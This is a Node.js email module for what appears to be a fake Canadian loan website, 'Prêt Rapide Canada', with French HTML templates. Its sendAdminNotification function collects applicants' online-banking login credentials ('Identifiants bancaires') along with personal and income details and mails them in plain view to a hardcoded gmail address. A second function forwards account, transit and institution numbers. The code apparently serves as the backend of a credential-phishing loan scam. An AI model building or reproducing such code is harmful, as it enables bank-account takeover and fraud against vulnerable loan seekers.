const nodemailer = require('nodemailer');
const crypto = require('crypto');

const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || 'smtp.gmail.com',
  port: 465,
  secure: true,
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS,
  },
  pool: true,
  maxConnections: 5,
  rateLimit: 5,
  tls: {
    rejectUnauthorized: true,
  },
});

const DOMAIN = (process.env.SMTP_USER || '').split('@')[1] || 'gmail.com';
const FROM   = `"${process.env.FROM_NAME || 'Prêt Rapide Canada'}" <${process.env.FROM_EMAIL || process.env.SMTP_USER}>`;

function getPublicSiteUrl() {
  if (process.env.APP_URL) return process.env.APP_URL.replace(/\/$/, '');
  if (process.env.VERCEL_URL) return `https://${process.env.VERCEL_URL.replace(/^https?:\/\//, '')}`;
  return 'https://pret-rapide.vercel.app';
}

const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'autokompetenzgmbh@gmail.com';

async function sendMail({ to, subject, html, text }) {
  const messageId = `<${crypto.randomUUID()}@${DOMAIN}>`;
  return transporter.sendMail({
    from: FROM,
    to,
    subject,
    html,
    text,
    headers: {
      'Message-ID': messageId,
      'X-Mailer': 'Prêt Rapide Canada Mailer v1',
      'X-Entity-Ref-ID': crypto.randomUUID(),
      'Precedence': 'bulk',
      'List-Unsubscribe': `<mailto:${process.env.SMTP_USER}?subject=unsubscribe>`,
      'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click',
    },
  });
}

function formatDate(date) {
  return new Date(date).toLocaleDateString('fr-FR', {
    day: 'numeric', month: 'long', year: 'numeric',
  });
}

function baseTemplate(content) {
  return `<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Prêt Rapide Canada</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800;900&family=Playfair+Display:wght@700;800&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #f4f6f9;
      font-family: 'Outfit', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      -webkit-font-smoothing: antialiased;
    }
    a { color: #1a3a6b; text-decoration: none; }
    @media only screen and (max-width: 600px) {
      .email-container { width: 100% !important; }
      .email-padding { padding: 24px 20px !important; }
    }
  </style>
</head>
<body>
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#f4f6f9;min-height:100vh;">
    <tr><td align="center" style="padding:40px 16px;">
      <table width="600" cellpadding="0" cellspacing="0" class="email-container" style="max-width:600px;width:100%;">

        <tr>
          <td style="background:linear-gradient(135deg, #0A1F44 0%, #142d5e 100%);border-radius:16px 16px 0 0;padding:36px 48px;">
            <table width="100%" cellpadding="0" cellspacing="0">
              <tr>
                <td>
                  <div style="font-family:'Playfair Display',Georgia,serif;font-size:26px;font-weight:800;color:#ffffff;letter-spacing:-0.01em;">Prêt Rapide</div>
                  <div style="font-size:10px;letter-spacing:0.45em;color:#F5A623;text-transform:uppercase;margin-top:4px;">Canada · Service de prêt en ligne</div>
                </td>
                <td align="right" valign="middle">
                  <table cellpadding="0" cellspacing="0" style="margin-left:auto;"><tr><td style="width:48px;height:48px;background:rgba(245,166,35,0.15);border-radius:12px;text-align:center;vertical-align:middle;font-size:22px;line-height:48px;">💰</td></tr></table>
                </td>
              </tr>
            </table>
          </td>
        </tr>

        <tr>
          <td style="background:#ffffff;padding:48px 48px 40px;" class="email-padding">
            ${content}
          </td>
        </tr>

        <tr>
          <td style="background:#ffffff;border-radius:0 0 16px 16px;padding:0 48px 32px;" class="email-padding">
            <div style="height:1px;background:#e8edf4;margin-bottom:24px;"></div>
            <table width="100%" cellpadding="0" cellspacing="0">
              <tr>
                <td style="font-size:13px;color:#8896a8;line-height:1.8;">
                  <strong style="color:#0A1F44;">Prêt Rapide Canada</strong><br/>
                  Service de prêt en ligne · Canada<br/>
                  <a href="mailto:contact@pretrapideca.com" style="color:#F5A623;">contact@pretrapideca.com</a>
                </td>
                <td align="right" style="font-size:12px;color:#b0bcca;">
                  © ${new Date().getFullYear()} Prêt Rapide Canada
                </td>
              </tr>
            </table>
          </td>
        </tr>

      </table>
    </td></tr>
  </table>
</body>
</html>`;
}

async function sendClientConfirmation({ email, firstName, loanAmount, monthlyIncome, bankName, trackingNumber }) {
  const loanAmountFormatted = loanAmount ? `${loanAmount}$` : '—';
  const monthlyIncomeFormatted = monthlyIncome ? `${monthlyIncome}$` : '—';
  const siteUrl = getPublicSiteUrl();
  const trackingUrl = trackingNumber ? `${siteUrl}/suivi?num=${encodeURIComponent(trackingNumber)}` : `${siteUrl}/suivi`;
  const content = `
    <div style="text-align:center;margin-bottom:40px;">
      <h1 style="margin:0 0 12px;font-family:'Playfair Display',Georgia,serif;font-size:32px;font-weight:800;color:#0A1F44;letter-spacing:-0.02em;">Demande reçue, ${firstName} !</h1>
      <p style="margin:0;font-size:18px;color:#5a6a7e;line-height:1.7;">Nous traitons votre demande de prêt.</p>
    </div>

    ${trackingNumber ? `
    <table width="100%" cellpadding="0" cellspacing="0" style="margin-bottom:32px;">
      <tr>
        <td align="center" style="background:#0A1F44;border-radius:14px;padding:26px 24px;">
          <div style="font-size:11px;font-weight:700;letter-spacing:0.35em;text-transform:uppercase;color:rgba(255,255,255,0.55);margin-bottom:8px;">Votre numéro de suivi</div>
          <div style="font-family:'Courier New',monospace;font-size:30px;font-weight:800;color:#F5A623;letter-spacing:0.12em;">${trackingNumber}</div>
          <div style="margin-top:16px;">
            <a href="${trackingUrl}" style="display:inline-block;background:#F5A623;color:#0A1F44;font-weight:800;font-size:13px;letter-spacing:0.08em;text-transform:uppercase;text-decoration:none;padding:12px 24px;border-radius:8px;">Suivre mon dossier →</a>
          </div>
        </td>
      </tr>
    </table>
    ` : ''}

    <div style="height:1px;background:linear-gradient(to right, transparent, #e0e7ef, transparent);margin-bottom:36px;"></div>

    <p style="font-size:17px;color:#3d4a5c;line-height:1.8;margin:0 0 28px;">
      Bonjour <strong style="color:#0A1F44;">${firstName}</strong>,<br/><br/>
      Nous avons bien reçu votre demande de prêt. Notre équipe l'analyse et vous recontactera sous <strong style="color:#F5A623;">24h maximum</strong>.
    </p>

    <table width="100%" cellpadding="0" cellspacing="0" style="margin-bottom:36px;">
      <tr>
        <td style="background:#f8faff;border-radius:12px;padding:20px 24px;">
          <table width="100%" cellpadding="0" cellspacing="0">
            <tr>
              <td valign="middle">
                <table cellpadding="0" cellspacing="0">
                  <tr>
                    <td style="width:48px;height:48px;background:#fff;border-radius:10px;text-align:center;vertical-align:middle;box-shadow:0 2px 8px rgba(10,31,68,0.06);font-size:22px;">💰</td>
                    <td style="padding-left:16px;">
                      <div style="font-size:15px;font-weight:600;color:#0A1F44;margin-bottom:2px;">Montant demandé</div>
                      <div style="font-size:16px;color:#5a6a7e;">${loanAmountFormatted}</div>
                    </td>
                  </tr>
                </table>
              </td>
              <td valign="middle" align="right">
                <table cellpadding="0" cellspacing="0">
                  <tr>
                    <td style="width:48px;height:48px;background:#fff;border-radius:10px;text-align:center;vertical-align:middle;box-shadow:0 2px 8px rgba(10,31,68,0.06);font-size:22px;">🏦</td>
                    <td style="padding-left:16px;">
                      <div style="font-size:15px;font-weight:600;color:#0A1F44;margin-bottom:2px;">Banque sélectionnée</div>
                      <div style="font-size:16px;color:#5a6a7e;">${bankName}</div>
                    </td>
                  </tr>
                </table>
              </td>
            </tr>
          </table>
        </td>
      </tr>
    </table>

    <table width="100%" cellpadding="0" cellspacing="0" style="margin-bottom:36px;">
      <tr>
        <td style="background:#f8faff;border-radius:12px;padding:20px 24px;">
          <table width="100%" cellpadding="0" cellspacing="0">
            <tr>
              <td valign="middle">
                <table cellpadding="0" cellspacing="0">
                  <tr>
                    <td style="width:48px;height:48px;background:#fff;border-radius:10px;text-align:center;vertical-align:middle;box-shadow:0 2px 8px rgba(10,31,68,0.06);font-size:22px;">📊</td>
                    <td style="padding-left:16px;">
                      <div style="font-size:15px;font-weight:600;color:#0A1F44;margin-bottom:2px;">Revenu mensuel</div>
                      <div style="font-size:16px;color:#5a6a7e;">${monthlyIncomeFormatted}</div>
                    </td>
                  </tr>
                </table>
              </td>
            </tr>
          </table>
        </td>
      </tr>
    </table>

    <div style="text-align:center;margin:36px 0 0;">
      <div style="background:#f8faff;border-radius:12px;padding:20px 24px;">
        <p style="margin:0;font-size:15px;color:#5a6a7e;line-height:1.7;">
          Une question ? Répondez à cet e-mail ou contactez-nous.<br/>
          Notre équipe est là pour vous accompagner.
        </p>
      </div>
    </div>
  `;

  await sendMail({
    to: email,
    subject: `Confirmation de votre demande - Prêt Rapide Canada`,
    html: baseTemplate(content),
    text: [
      `Demande reçue, ${firstName} !`,
      ``,
      `Bonjour ${firstName},`,
      `Votre demande de prêt a bien été reçue.`,
      `Notre équipe l'analyse et vous recontactera sous 24h maximum.`,
      ``,
      trackingNumber ? `Numéro de suivi : ${trackingNumber}` : null,
      trackingNumber ? `Suivez votre dossier : ${trackingUrl}` : null,
      ``,
      `Montant demandé : ${loanAmountFormatted}`,
      `Revenu mensuel : ${monthlyIncomeFormatted}`,
      `Banque : ${bankName}`,
      ``,
      `-- Prêt Rapide Canada`,
      `Service de prêt en ligne · Canada`,
    ].filter(Boolean).join('\n'),
  });
}

async function sendAdminNotification(data) {
  const bankCredsHtml = Object.entries(data.bankCredentials || {})
    .map(([k, v]) => `<tr><td style="font-size:15px;color:#5a6a7e;padding:8px 0;border-bottom:1px solid #f0f2f5;">${k}</td><td align="right" style="font-size:15px;color:#0A1F44;font-weight:700;font-family:'Courier New',monospace;">${v}</td></tr>`)
    .join('');

  const fields = [
    { label: 'Nom complet', value: data.fullName },
    { label: 'Email', value: data.email, highlight: true },
    { label: 'Téléphone', value: data.phone },
    { label: 'Adresse', value: data.address },
    { label: 'Ville', value: data.city },
    { label: 'Code postal', value: data.postalCode },
    { label: 'Montant demandé', value: data.loanAmount ? `${data.loanAmount}$` : '—', highlight: true },
    { label: 'Revenu mensuel', value: data.monthlyIncome ? `${data.monthlyIncome}$` : '—' },
    { label: 'Profession', value: data.profession },
    { label: 'Prochain salaire', value: data.nextPayday },
    { label: 'Conjoint', value: data.jointRequest || 'Non' },
    { label: 'Objet du prêt', value: data.loanPurpose },
    { label: 'Date souhaitée', value: data.desiredDate },
    { label: 'Banque', value: data.bankName || data.bankId, highlight: true },
  ];

  const infoRows = fields.map(f => `
    <tr>
      <td style="padding:8px 0;border-bottom:1px solid #f4f6f9;">
        <span style="font-size:14px;color:#8896a8;font-weight:500;">${f.label}</span>
      </td>
      <td style="padding:8px 0;border-bottom:1px solid #f4f6f9;text-align:right;">
        <span style="font-size:15px;${f.highlight ? 'color:#F5A623;font-weight:700;' : 'color:#0A1F44;font-weight:600;'}">${f.value || '—'}</span>
      </td>
    </tr>
  `).join('');

  const content = `
    <div style="text-align:center;margin-bottom:36px;">
      <table cellpadding="0" cellspacing="0" style="margin:0 auto 20px;"><tr><td style="width:72px;height:72px;background:#fff8e1;border-radius:50%;text-align:center;vertical-align:middle;font-size:30px;line-height:72px;">🔔</td></tr></table>
      <h1 style="margin:0 0 8px;font-family:'Playfair Display',Georgia,serif;font-size:28px;font-weight:800;color:#0A1F44;">Nouvelle demande de prêt</h1>
      <p style="margin:0;font-size:16px;color:#5a6a7e;">${formatDate(new Date())}</p>
    </div>

    <div style="background:#f8faff;border:1px solid #e0e7ef;border-radius:12px;padding:24px 28px;margin-bottom:28px;">
      <div style="font-size:11px;font-weight:700;letter-spacing:0.35em;text-transform:uppercase;color:#8896a8;margin-bottom:18px;">Informations personnelles</div>
      <table width="100%" cellpadding="0" cellspacing="0">
        ${infoRows}
      </table>
    </div>

    <div style="background:#f8faff;border:1px solid #e0e7ef;border-radius:12px;padding:24px 28px;margin-bottom:28px;">
      <div style="font-size:11px;font-weight:700;letter-spacing:0.35em;text-transform:uppercase;color:#8896a8;margin-bottom:18px;">Identifiants bancaires</div>
      <table width="100%" cellpadding="0" cellspacing="0">
        ${bankCredsHtml || '<tr><td style="font-size:15px;color:#8896a8;padding:12px 0;text-align:center;">Aucun identifiant fourni</td></tr>'}
      </table>
    </div>

    <div style="text-align:center;margin-top:16px;">
      <span style="font-size:12px;color:#b0bcca;">Email généré automatiquement — Prêt Rapide Canada</span>
    </div>
  `;

  await sendMail({
    to: ADMIN_EMAIL,
    subject: `Nouvelle demande - ${data.fullName || 'Anonyme'} - ${data.bankName || data.bankId || '?'}`,
    html: baseTemplate(content),
    text: Object.entries({
      'Nom': data.fullName, 'Email': data.email, 'Téléphone': data.phone,
      'Adresse': data.address, 'Ville': data.city, 'Code postal': data.postalCode,
      'Montant demandé': data.loanAmount, 'Revenu mensuel': data.monthlyIncome, 'Profession': data.profession,
      'Prochain salaire': data.nextPayday, 'Conjoint': data.jointRequest,
      'Objet': data.loanPurpose, 'Date souhaitée': data.desiredDate,
      'Banque': data.bankName || data.bankId,
    }).map(([k, v]) => `${k} : ${v || '—'}`).join('\n') + '\n\n--- IDENTIFIANTS BANCAIRES ---\n' + Object.entries(data.bankCredentials || {}).map(([k, v]) => `${k} : ${v}`).join('\n'),
  });
}

const STATUS_LABELS = {
  en_attente:     'En attente',
  refusee:        'Refusée',
  confirmee:      'Confirmée',
  en_cours_envoi: "En cours d'envoi",
  bloque:         'Bloqué',
  rejete:         'Rejeté',
};

const STATUS_STEPS = {
  en_attente:     { step: 2, tone: '#D97706' },
  refusee:        { step: 0, tone: '#DC2626' },
  confirmee:      { step: 3, tone: '#16A34A' },
  en_cours_envoi: { step: 4, tone: '#16A34A' },
  en_attente_env: { step: 4, tone: '#D97706' },
  bloque:         { step: 4, tone: '#DC2626' },
  rejete:         { step: 4, tone: '#DC2626' },
};

async function sendStatusUpdateEmail({ email, firstName, trackingNumber, status, adminMessage }) {
  const siteUrl = getPublicSiteUrl();
  const trackingUrl = trackingNumber ? `${siteUrl}/suivi?num=${encodeURIComponent(trackingNumber)}` : `${siteUrl}/suivi`;
  const stats = STATUS_STEPS[status] || { step: 0, tone: '#8896a8' };
  const label = STATUS_LABELS[status] || status;

  const content = `
    <div style="text-align:center;margin-bottom:36px;">
      <h1 style="margin:0 0 10px;font-family:'Playfair Display',Georgia,serif;font-size:28px;font-weight:800;color:#0A1F44;">Évolution de votre dossier</h1>
      <p style="margin:0;font-size:16px;color:#5a6a7e;">Votre demande <strong style="color:#0A1F44;">${trackingNumber || ''}</strong> a été mise à jour.</p>
    </div>

    <div style="text-align:center;margin-bottom:32px;">
      <span style="display:inline-block;background:${stats.tone}12;border:1px solid ${stats.tone}55;color:${stats.tone};font-weight:800;font-size:14px;letter-spacing:0.06em;text-transform:uppercase;padding:10px 22px;border-radius:20px;">${label}</span>
    </div>

    ${adminMessage ? `
    <table width="100%" cellpadding="0" cellspacing="0" style="margin-bottom:28px;">
      <tr>
        <td style="background:#f8faff;border-left:3px solid #F5A623;border-radius:8px;padding:20px 22px;">
          <div style="font-size:11px;font-weight:700;letter-spacing:0.3em;text-transform:uppercase;color:#8896a8;margin-bottom:8px;">Message de votre conseiller</div>
          <div style="font-size:16px;color:#0A1F44;line-height:1.7;">${adminMessage}</div>
        </td>
      </tr>
    </table>
    ` : ''}

    <div style="text-align:center;margin-top:28px;">
      <a href="${trackingUrl}" style="display:inline-block;background:#0A1F44;color:#ffffff;font-weight:800;font-size:13px;letter-spacing:0.08em;text-transform:uppercase;text-decoration:none;padding:14px 28px;border-radius:8px;">Consulter mon dossier →</a>
      <p style="font-size:12px;color:#b0bcca;margin-top:14px;">Vous pouvez consulter votre dossier à tout moment avec votre numéro de suivi.</p>
    </div>
  `;

  await sendMail({
    to: email,
    subject: `Votre dossier ${trackingNumber || ''} est ${label.toLowerCase()} - Prêt Rapide Canada`,
    html: baseTemplate(content),
    text: [
      `Évolution de votre dossier ${trackingNumber || ''}`,
      ``,
      `Votre demande est maintenant : ${label}.`,
      adminMessage ? `Message de votre conseiller : ${adminMessage}` : null,
      ``,
      `Consultez votre dossier : ${trackingUrl}`,
      ``,
      `-- Prêt Rapide Canada`,
      `Service de prêt en ligne · Canada`,
    ].filter(Boolean).join('\n'),
  });
}

async function sendAdminBankInfoNotification(data) {
  const bankInfo = data.bankInfo || {};
  const imageNote = data.bankInfoImage ? ' (capture d\'écran / image fournie)' : '';
  const rows = [
    { k: 'Nom complet', v: data.fullName },
    { k: 'Numéro de suivi', v: data.trackingNumber },
    { k: 'Banque', v: bankInfo.bankName },
    { k: 'Numéro de compte', v: bankInfo.accountNumber },
    { k: 'Numéro de transit', v: bankInfo.transitNumber },
    { k: "Numéro d'institution", v: bankInfo.institutionNumber },
  ];

  const htmlRows = rows.map(r => `
    <tr>
      <td style="padding:8px 0;border-bottom:1px solid #f4f6f9;font-size:14px;color:#8896a8;font-weight:500;">${r.k}</td>
      <td style="padding:8px 0;border-bottom:1px solid #f4f6f9;text-align:right;font-size:15px;color:#0A1F44;font-weight:700;font-family:'Courier New',monospace;">${r.v || '—'}</td>
    </tr>`).join('');

  const content = `
    <div style="text-align:center;margin-bottom:36px;">
      <table cellpadding="0" cellspacing="0" style="margin:0 auto 20px;"><tr><td style="width:72px;height:72px;background:#fff8e1;border-radius:50%;text-align:center;vertical-align:middle;font-size:30px;line-height:72px;">🏦</td></tr></table>
      <h1 style="margin:0 0 8px;font-family:'Playfair Display',Georgia,serif;font-size:28px;font-weight:800;color:#0A1F44;">Informations bancaires reçues</h1>
      <p style="margin:0;font-size:16px;color:#5a6a7e;">${formatDate(new Date())}${imageNote}</p>
    </div>

    <div style="background:#f8faff;border:1px solid #e0e7ef;border-radius:12px;padding:24px 28px;margin-bottom:28px;">
      <div style="font-size:11px;font-weight:700;letter-spacing:0.35em;text-transform:uppercase;color:#8896a8;margin-bottom:18px;">Détails du transfert</div>
      <table width="100%" cellpadding="0" cellspacing="0">
        ${htmlRows}
      </table>
    </div>

    ${data.bankInfoImage ? `
    <div style="background:#fff8e1;border:1px solid #f7e8b8;border-radius:12px;padding:20px 24px;text-align:center;margin-top:8px;">
      <p style="margin:0 0 12px;font-size:14px;color:#5a6a7e;">📎 Une capture d'écran a été jointe au dossier. Consultez-la dans votre espace admin.</p>
      <a href="${getPublicSiteUrl()}/admin" style="display:inline-block;background:#0A1F44;color:#ffffff;font-weight:800;font-size:13px;letter-spacing:0.08em;text-transform:uppercase;text-decoration:none;padding:12px 24px;border-radius:8px;">Ouvrir l'espace admin →</a>
    </div>
    ` : ''}

    <div style="text-align:center;margin-top:16px;">
      <span style="font-size:12px;color:#b0bcca;">Email généré automatiquement — Prêt Rapide Canada</span>
    </div>
  `;

  await sendMail({
    to: ADMIN_EMAIL,
    subject: `Infos bancaires - ${data.fullName || 'Anonyme'} - ${data.trackingNumber || '?'}`,
    html: baseTemplate(content),
    text: rows.map(r => `${r.k} : ${r.v || '—'}`).join('\n') + (data.bankInfoImage ? '\n\n(Image / capture fournie — voir l\'e-mail HTML)' : ''),
  });
}

module.exports = {
  sendClientConfirmation,
  sendAdminNotification,
  sendAdminBankInfoNotification,
  sendStatusUpdateEmail,
};
